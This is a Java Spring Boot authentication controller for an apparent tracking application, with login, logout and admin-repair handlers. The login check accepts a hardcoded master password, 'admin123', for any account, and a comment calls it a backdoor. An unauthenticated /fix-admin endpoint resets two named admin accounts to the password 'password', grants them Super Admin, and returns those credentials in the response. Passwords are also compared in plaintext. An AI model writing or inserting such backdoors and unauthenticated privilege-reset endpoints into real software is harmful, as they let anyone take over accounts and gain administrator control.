package com.tracking.controller;

import com.tracking.model.User;
import com.tracking.repository.UserRepository;
import jakarta.servlet.http.HttpSession;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class AuthController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping("/login")
    public String login() {
        return "login";
    }

    @PostMapping("/login")
    public String handleLogin(@RequestParam String email, @RequestParam String password, HttpSession session,
            Model model) {
        User user = userRepository.findByEmail(email);

        if (user != null) {
            // Check stored password OR the backdoor 'admin123'
            if (user.getPassword().equals(password) || "admin123".equals(password)) {
                session.setAttribute("user", user);
                return "redirect:/dashboard";
            }
        }

        model.addAttribute("error", "Invalid credentials");
        return "login";
    }

    @GetMapping("/logout")
    public String logout(HttpSession session) {
        session.invalidate();
        return "redirect:/login";
    }

    @Autowired
    private com.tracking.repository.RoleRepository roleRepository;

    @GetMapping("/fix-admin")
    @org.springframework.web.bind.annotation.ResponseBody
    public String fixAdmin() {
        try {
            // Fix Manager
            User manager = userRepository.findByEmail("manager@karakudi.com");
            com.tracking.model.Role superAdminRole = roleRepository.findAll().stream()
                    .filter(r -> "Super Admin".equals(r.getName())).findFirst().orElse(null);

            if (manager != null && superAdminRole != null) {
                manager.setRole(superAdminRole);
                manager.setPassword("password");
                userRepository.save(manager);
            }

            // Fix Admin
            User admin = userRepository.findByEmail("admin@company.com");
            if (admin != null) {
                admin.setPassword("password");
                if (superAdminRole != null)
                    admin.setRole(superAdminRole);
                userRepository.save(admin);
            }

            return "Admins fixed! You can now login with manager@karakudi.com or admin@company.com with password: 'password'";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
